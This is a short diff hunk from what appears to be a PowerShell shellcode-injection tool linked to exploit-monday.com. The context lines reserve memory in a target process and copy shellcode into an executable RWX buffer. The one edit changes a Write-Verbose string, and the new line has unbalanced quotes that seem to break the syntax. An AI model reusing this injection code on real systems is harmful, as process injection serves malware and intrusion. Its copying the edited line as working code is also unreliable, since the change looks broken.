@@ -468,7 +468,7 @@ http://www.exploit-monday.com
             Throw "Unable to allocate shellcode memory in PID: $ProcessID"
         }
         
-        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"
+        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("'X$([IntPtr]::Size*2)'))"
 
         # Copy shellcode to RWX buffer
         [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
